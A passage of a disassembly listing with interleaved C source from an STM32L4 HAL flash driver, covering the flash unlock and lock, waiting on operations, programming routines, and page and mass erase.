 80014dc:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 80014de:	2300      	movs	r3, #0
 80014e0:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 80014e2:	4b0b      	ldr	r3, [pc, #44]	; (8001510 <HAL_FLASH_Unlock+0x38>)
 80014e4:	695b      	ldr	r3, [r3, #20]
 80014e6:	2b00      	cmp	r3, #0
 80014e8:	da0b      	bge.n	8001502 <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 80014ea:	4b09      	ldr	r3, [pc, #36]	; (8001510 <HAL_FLASH_Unlock+0x38>)
 80014ec:	4a09      	ldr	r2, [pc, #36]	; (8001514 <HAL_FLASH_Unlock+0x3c>)
 80014ee:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 80014f0:	4b07      	ldr	r3, [pc, #28]	; (8001510 <HAL_FLASH_Unlock+0x38>)
 80014f2:	4a09      	ldr	r2, [pc, #36]	; (8001518 <HAL_FLASH_Unlock+0x40>)
 80014f4:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 80014f6:	4b06      	ldr	r3, [pc, #24]	; (8001510 <HAL_FLASH_Unlock+0x38>)
 80014f8:	695b      	ldr	r3, [r3, #20]
 80014fa:	2b00      	cmp	r3, #0
 80014fc:	da01      	bge.n	8001502 <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 80014fe:	2301      	movs	r3, #1
 8001500:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 8001502:	79fb      	ldrb	r3, [r7, #7]
}
 8001504:	4618      	mov	r0, r3
 8001506:	370c      	adds	r7, #12
 8001508:	46bd      	mov	sp, r7
 800150a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800150e:	4770      	bx	lr
 8001510:	40022000 	.word	0x40022000
 8001514:	45670123 	.word	0x45670123
 8001518:	cdef89ab 	.word	0xcdef89ab

0800151c <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 800151c:	b480      	push	{r7}
 800151e:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 8001520:	4b05      	ldr	r3, [pc, #20]	; (8001538 <HAL_FLASH_Lock+0x1c>)
 8001522:	695b      	ldr	r3, [r3, #20]
 8001524:	4a04      	ldr	r2, [pc, #16]	; (8001538 <HAL_FLASH_Lock+0x1c>)
 8001526:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 800152a:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 800152c:	2300      	movs	r3, #0
}
 800152e:	4618      	mov	r0, r3
 8001530:	46bd      	mov	sp, r7
 8001532:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001536:	4770      	bx	lr
 8001538:	40022000 	.word	0x40022000

0800153c <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 800153c:	b580      	push	{r7, lr}
 800153e:	b084      	sub	sp, #16
 8001540:	af00      	add	r7, sp, #0
 8001542:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 8001544:	f7ff fe1a 	bl	800117c <HAL_GetTick>
 8001548:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 800154a:	e00d      	b.n	8001568 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 800154c:	687b      	ldr	r3, [r7, #4]
 800154e:	f1b3 3fff 	cmp.w	r3, #4294967295
 8001552:	d009      	beq.n	8001568 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 8001554:	f7ff fe12 	bl	800117c <HAL_GetTick>
 8001558:	4602      	mov	r2, r0
 800155a:	68fb      	ldr	r3, [r7, #12]
 800155c:	1ad3      	subs	r3, r2, r3
 800155e:	687a      	ldr	r2, [r7, #4]
 8001560:	429a      	cmp	r2, r3
 8001562:	d801      	bhi.n	8001568 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 8001564:	2303      	movs	r3, #3
 8001566:	e036      	b.n	80015d6 <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001568:	4b1d      	ldr	r3, [pc, #116]	; (80015e0 <FLASH_WaitForLastOperation+0xa4>)
 800156a:	691b      	ldr	r3, [r3, #16]
 800156c:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001570:	2b00      	cmp	r3, #0
 8001572:	d1eb      	bne.n	800154c <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 8001574:	4b1a      	ldr	r3, [pc, #104]	; (80015e0 <FLASH_WaitForLastOperation+0xa4>)
 8001576:	691a      	ldr	r2, [r3, #16]
 8001578:	4b1a      	ldr	r3, [pc, #104]	; (80015e4 <FLASH_WaitForLastOperation+0xa8>)
 800157a:	4013      	ands	r3, r2
 800157c:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 800157e:	68bb      	ldr	r3, [r7, #8]
 8001580:	2b00      	cmp	r3, #0
 8001582:	d01e      	beq.n	80015c2 <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 8001584:	4b18      	ldr	r3, [pc, #96]	; (80015e8 <FLASH_WaitForLastOperation+0xac>)
 8001586:	685a      	ldr	r2, [r3, #4]
 8001588:	68bb      	ldr	r3, [r7, #8]
 800158a:	4313      	orrs	r3, r2
 800158c:	4a16      	ldr	r2, [pc, #88]	; (80015e8 <FLASH_WaitForLastOperation+0xac>)
 800158e:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 8001590:	68bb      	ldr	r3, [r7, #8]
 8001592:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001596:	2b00      	cmp	r3, #0
 8001598:	d007      	beq.n	80015aa <FLASH_WaitForLastOperation+0x6e>
 800159a:	4b11      	ldr	r3, [pc, #68]	; (80015e0 <FLASH_WaitForLastOperation+0xa4>)
 800159c:	699a      	ldr	r2, [r3, #24]
 800159e:	68bb      	ldr	r3, [r7, #8]
 80015a0:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 80015a4:	490e      	ldr	r1, [pc, #56]	; (80015e0 <FLASH_WaitForLastOperation+0xa4>)
 80015a6:	4313      	orrs	r3, r2
 80015a8:	618b      	str	r3, [r1, #24]
 80015aa:	68bb      	ldr	r3, [r7, #8]
 80015ac:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80015b0:	2b00      	cmp	r3, #0
 80015b2:	d004      	beq.n	80015be <FLASH_WaitForLastOperation+0x82>
 80015b4:	4a0a      	ldr	r2, [pc, #40]	; (80015e0 <FLASH_WaitForLastOperation+0xa4>)
 80015b6:	68bb      	ldr	r3, [r7, #8]
 80015b8:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80015bc:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 80015be:	2301      	movs	r3, #1
 80015c0:	e009      	b.n	80015d6 <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 80015c2:	4b07      	ldr	r3, [pc, #28]	; (80015e0 <FLASH_WaitForLastOperation+0xa4>)
 80015c4:	691b      	ldr	r3, [r3, #16]
 80015c6:	f003 0301 	and.w	r3, r3, #1
 80015ca:	2b00      	cmp	r3, #0
 80015cc:	d002      	beq.n	80015d4 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 80015ce:	4b04      	ldr	r3, [pc, #16]	; (80015e0 <FLASH_WaitForLastOperation+0xa4>)
 80015d0:	2201      	movs	r2, #1
 80015d2:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 80015d4:	2300      	movs	r3, #0
}
 80015d6:	4618      	mov	r0, r3
 80015d8:	3710      	adds	r7, #16
 80015da:	46bd      	mov	sp, r7
 80015dc:	bd80      	pop	{r7, pc}
 80015de:	bf00      	nop
 80015e0:	40022000 	.word	0x40022000
 80015e4:	0002c3fa 	.word	0x0002c3fa
 80015e8:	2000000c 	.word	0x2000000c

080015ec <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 80015ec:	b480      	push	{r7}
 80015ee:	b085      	sub	sp, #20
 80015f0:	af00      	add	r7, sp, #0
 80015f2:	60f8      	str	r0, [r7, #12]
 80015f4:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 80015f8:	4b0e      	ldr	r3, [pc, #56]	; (8001634 <FLASH_Program_DoubleWord+0x48>)
 80015fa:	695b      	ldr	r3, [r3, #20]
 80015fc:	4a0d      	ldr	r2, [pc, #52]	; (8001634 <FLASH_Program_DoubleWord+0x48>)
 80015fe:	f043 0301 	orr.w	r3, r3, #1
 8001602:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 8001604:	68fb      	ldr	r3, [r7, #12]
 8001606:	683a      	ldr	r2, [r7, #0]
 8001608:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 800160a:	f3bf 8f6f 	isb	sy
}
 800160e:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 8001610:	e9d7 0100 	ldrd	r0, r1, [r7]
 8001614:	f04f 0200 	mov.w	r2, #0
 8001618:	f04f 0300 	mov.w	r3, #0
 800161c:	000a      	movs	r2, r1
 800161e:	2300      	movs	r3, #0
 8001620:	68f9      	ldr	r1, [r7, #12]
 8001622:	3104      	adds	r1, #4
 8001624:	4613      	mov	r3, r2
 8001626:	600b      	str	r3, [r1, #0]
}
 8001628:	bf00      	nop
 800162a:	3714      	adds	r7, #20
 800162c:	46bd      	mov	sp, r7
 800162e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001632:	4770      	bx	lr
 8001634:	40022000 	.word	0x40022000

08001638 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 8001638:	b480      	push	{r7}
 800163a:	b089      	sub	sp, #36	; 0x24
 800163c:	af00      	add	r7, sp, #0
 800163e:	6078      	str	r0, [r7, #4]
 8001640:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 8001642:	2340      	movs	r3, #64	; 0x40
 8001644:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 8001646:	687b      	ldr	r3, [r7, #4]
 8001648:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 800164a:	683b      	ldr	r3, [r7, #0]
 800164c:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 800164e:	4b14      	ldr	r3, [pc, #80]	; (80016a0 <FLASH_Program_Fast+0x68>)
 8001650:	695b      	ldr	r3, [r3, #20]
 8001652:	4a13      	ldr	r2, [pc, #76]	; (80016a0 <FLASH_Program_Fast+0x68>)
 8001654:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8001658:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 800165a:	f3ef 8310 	mrs	r3, PRIMASK
 800165e:	60fb      	str	r3, [r7, #12]
  return(result);
 8001660:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 8001662:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 8001664:	b672      	cpsid	i
}
 8001666:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 8001668:	697b      	ldr	r3, [r7, #20]
 800166a:	681a      	ldr	r2, [r3, #0]
 800166c:	69bb      	ldr	r3, [r7, #24]
 800166e:	601a      	str	r2, [r3, #0]
    dest_addr++;
 8001670:	69bb      	ldr	r3, [r7, #24]
 8001672:	3304      	adds	r3, #4
 8001674:	61bb      	str	r3, [r7, #24]
    src_addr++;
 8001676:	697b      	ldr	r3, [r7, #20]
 8001678:	3304      	adds	r3, #4
 800167a:	617b      	str	r3, [r7, #20]
    row_index--;
 800167c:	7ffb      	ldrb	r3, [r7, #31]
 800167e:	3b01      	subs	r3, #1
 8001680:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 8001682:	7ffb      	ldrb	r3, [r7, #31]
 8001684:	2b00      	cmp	r3, #0
 8001686:	d1ef      	bne.n	8001668 <FLASH_Program_Fast+0x30>
 8001688:	693b      	ldr	r3, [r7, #16]
 800168a:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 800168c:	68bb      	ldr	r3, [r7, #8]
 800168e:	f383 8810 	msr	PRIMASK, r3
}
 8001692:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 8001694:	bf00      	nop
 8001696:	3724      	adds	r7, #36	; 0x24
 8001698:	46bd      	mov	sp, r7
 800169a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800169e:	4770      	bx	lr
 80016a0:	40022000 	.word	0x40022000

080016a4 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 80016a4:	b580      	push	{r7, lr}
 80016a6:	b084      	sub	sp, #16
 80016a8:	af00      	add	r7, sp, #0
 80016aa:	6078      	str	r0, [r7, #4]
 80016ac:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 80016ae:	4b48      	ldr	r3, [pc, #288]	; (80017d0 <HAL_FLASHEx_Erase+0x12c>)
 80016b0:	781b      	ldrb	r3, [r3, #0]
 80016b2:	2b01      	cmp	r3, #1
 80016b4:	d101      	bne.n	80016ba <HAL_FLASHEx_Erase+0x16>
 80016b6:	2302      	movs	r3, #2
 80016b8:	e085      	b.n	80017c6 <HAL_FLASHEx_Erase+0x122>
 80016ba:	4b45      	ldr	r3, [pc, #276]	; (80017d0 <HAL_FLASHEx_Erase+0x12c>)
 80016bc:	2201      	movs	r2, #1
 80016be:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80016c0:	f24c 3050 	movw	r0, #50000	; 0xc350
 80016c4:	f7ff ff3a 	bl	800153c <FLASH_WaitForLastOperation>
 80016c8:	4603      	mov	r3, r0
 80016ca:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 80016cc:	7bfb      	ldrb	r3, [r7, #15]
 80016ce:	2b00      	cmp	r3, #0
 80016d0:	d175      	bne.n	80017be <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80016d2:	4b3f      	ldr	r3, [pc, #252]	; (80017d0 <HAL_FLASHEx_Erase+0x12c>)
 80016d4:	2200      	movs	r2, #0
 80016d6:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 80016d8:	4b3e      	ldr	r3, [pc, #248]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 80016da:	681b      	ldr	r3, [r3, #0]
 80016dc:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80016e0:	2b00      	cmp	r3, #0
 80016e2:	d013      	beq.n	800170c <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80016e4:	4b3b      	ldr	r3, [pc, #236]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 80016e6:	681b      	ldr	r3, [r3, #0]
 80016e8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80016ec:	2b00      	cmp	r3, #0
 80016ee:	d009      	beq.n	8001704 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 80016f0:	4b38      	ldr	r3, [pc, #224]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 80016f2:	681b      	ldr	r3, [r3, #0]
 80016f4:	4a37      	ldr	r2, [pc, #220]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 80016f6:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80016fa:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 80016fc:	4b34      	ldr	r3, [pc, #208]	; (80017d0 <HAL_FLASHEx_Erase+0x12c>)
 80016fe:	2203      	movs	r2, #3
 8001700:	771a      	strb	r2, [r3, #28]
 8001702:	e016      	b.n	8001732 <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 8001704:	4b32      	ldr	r3, [pc, #200]	; (80017d0 <HAL_FLASHEx_Erase+0x12c>)
 8001706:	2201      	movs	r2, #1
 8001708:	771a      	strb	r2, [r3, #28]
 800170a:	e012      	b.n	8001732 <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 800170c:	4b31      	ldr	r3, [pc, #196]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 800170e:	681b      	ldr	r3, [r3, #0]
 8001710:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001714:	2b00      	cmp	r3, #0
 8001716:	d009      	beq.n	800172c <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001718:	4b2e      	ldr	r3, [pc, #184]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 800171a:	681b      	ldr	r3, [r3, #0]
 800171c:	4a2d      	ldr	r2, [pc, #180]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 800171e:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001722:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001724:	4b2a      	ldr	r3, [pc, #168]	; (80017d0 <HAL_FLASHEx_Erase+0x12c>)
 8001726:	2202      	movs	r2, #2
 8001728:	771a      	strb	r2, [r3, #28]
 800172a:	e002      	b.n	8001732 <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 800172c:	4b28      	ldr	r3, [pc, #160]	; (80017d0 <HAL_FLASHEx_Erase+0x12c>)
 800172e:	2200      	movs	r2, #0
 8001730:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 8001732:	687b      	ldr	r3, [r7, #4]
 8001734:	681b      	ldr	r3, [r3, #0]
 8001736:	2b01      	cmp	r3, #1
 8001738:	d111      	bne.n	800175e <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 800173a:	687b      	ldr	r3, [r7, #4]
 800173c:	685b      	ldr	r3, [r3, #4]
 800173e:	4618      	mov	r0, r3
 8001740:	f000 f84a 	bl	80017d8 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001744:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001748:	f7ff fef8 	bl	800153c <FLASH_WaitForLastOperation>
 800174c:	4603      	mov	r3, r0
 800174e:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 8001750:	4b20      	ldr	r3, [pc, #128]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 8001752:	695b      	ldr	r3, [r3, #20]
 8001754:	4a1f      	ldr	r2, [pc, #124]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 8001756:	f023 0304 	bic.w	r3, r3, #4
 800175a:	6153      	str	r3, [r2, #20]
 800175c:	e02d      	b.n	80017ba <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 800175e:	683b      	ldr	r3, [r7, #0]
 8001760:	f04f 32ff 	mov.w	r2, #4294967295
 8001764:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001766:	687b      	ldr	r3, [r7, #4]
 8001768:	689b      	ldr	r3, [r3, #8]
 800176a:	60bb      	str	r3, [r7, #8]
 800176c:	e01d      	b.n	80017aa <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 800176e:	687b      	ldr	r3, [r7, #4]
 8001770:	685b      	ldr	r3, [r3, #4]
 8001772:	4619      	mov	r1, r3
 8001774:	68b8      	ldr	r0, [r7, #8]
 8001776:	f000 f84d 	bl	8001814 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800177a:	f24c 3050 	movw	r0, #50000	; 0xc350
 800177e:	f7ff fedd 	bl	800153c <FLASH_WaitForLastOperation>
 8001782:	4603      	mov	r3, r0
 8001784:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 8001786:	4b13      	ldr	r3, [pc, #76]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 8001788:	695b      	ldr	r3, [r3, #20]
 800178a:	4a12      	ldr	r2, [pc, #72]	; (80017d4 <HAL_FLASHEx_Erase+0x130>)
 800178c:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 8001790:	f023 0302 	bic.w	r3, r3, #2
 8001794:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 8001796:	7bfb      	ldrb	r3, [r7, #15]
 8001798:	2b00      	cmp	r3, #0
 800179a:	d003      	beq.n	80017a4 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 800179c:	683b      	ldr	r3, [r7, #0]
 800179e:	68ba      	ldr	r2, [r7, #8]
 80017a0:	601a      	str	r2, [r3, #0]
          break;
 80017a2:	e00a      	b.n	80017ba <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80017a4:	68bb      	ldr	r3, [r7, #8]
 80017a6:	3301      	adds	r3, #1
 80017a8:	60bb      	str	r3, [r7, #8]
 80017aa:	687b      	ldr	r3, [r7, #4]
 80017ac:	689a      	ldr	r2, [r3, #8]
 80017ae:	687b      	ldr	r3, [r7, #4]
 80017b0:	68db      	ldr	r3, [r3, #12]
 80017b2:	4413      	add	r3, r2
 80017b4:	68ba      	ldr	r2, [r7, #8]
 80017b6:	429a      	cmp	r2, r3
 80017b8:	d3d9      	bcc.n	800176e <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80017ba:	f000 f84f 	bl	800185c <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80017be:	4b04      	ldr	r3, [pc, #16]	; (80017d0 <HAL_FLASHEx_Erase+0x12c>)
 80017c0:	2200      	movs	r2, #0
 80017c2:	701a      	strb	r2, [r3, #0]

  return status;
 80017c4:	7bfb      	ldrb	r3, [r7, #15]
}
 80017c6:	4618      	mov	r0, r3
 80017c8:	3710      	adds	r7, #16
 80017ca:	46bd      	mov	sp, r7
 80017cc:	bd80      	pop	{r7, pc}
 80017ce:	bf00      	nop
 80017d0:	2000000c 	.word	0x2000000c
 80017d4:	40022000 	.word	0x40022000

080017d8 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 80017d8:	b480      	push	{r7}
 80017da:	b083      	sub	sp, #12
 80017dc:	af00      	add	r7, sp, #0
 80017de:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 80017e0:	687b      	ldr	r3, [r7, #4]
 80017e2:	f003 0301 	and.w	r3, r3, #1
 80017e6:	2b00      	cmp	r3, #0
 80017e8:	d005      	beq.n	80017f6 <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 80017ea:	4b09      	ldr	r3, [pc, #36]	; (8001810 <FLASH_MassErase+0x38>)
 80017ec:	695b      	ldr	r3, [r3, #20]
 80017ee:	4a08      	ldr	r2, [pc, #32]	; (8001810 <FLASH_MassErase+0x38>)
 80017f0:	f043 0304 	orr.w	r3, r3, #4
 80017f4:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 80017f6:	4b06      	ldr	r3, [pc, #24]	; (8001810 <FLASH_MassErase+0x38>)
 80017f8:	695b      	ldr	r3, [r3, #20]
 80017fa:	4a05      	ldr	r2, [pc, #20]	; (8001810 <FLASH_MassErase+0x38>)
 80017fc:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001800:	6153      	str	r3, [r2, #20]
}
 8001802:	bf00      	nop
 8001804:	370c      	adds	r7, #12
 8001806:	46bd      	mov	sp, r7
 8001808:	f85d 7b04 	ldr.w	r7, [sp], #4
 800180c:	4770      	bx	lr
 800180e:	bf00      	nop
 8001810:	40022000 	.word	0x40022000

08001814 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 8001814:	b480      	push	{r7}
 8001816:	b083      	sub	sp, #12
 8001818:	af00      	add	r7, sp, #0
 800181a:	6078      	str	r0, [r7, #4]
 800181c:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 800181e:	4b0e      	ldr	r3, [pc, #56]	; (8001858 <FLASH_PageErase+0x44>)
 8001820:	695b      	ldr	r3, [r3, #20]
 8001822:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 8001826:	687b      	ldr	r3, [r7, #4]
 8001828:	00db      	lsls	r3, r3, #3
 800182a:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 800182e:	490a      	ldr	r1, [pc, #40]	; (8001858 <FLASH_PageErase+0x44>)
 8001830:	4313      	orrs	r3, r2
 8001832:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 8001834:	4b08      	ldr	r3, [pc, #32]	; (8001858 <FLASH_PageErase+0x44>)
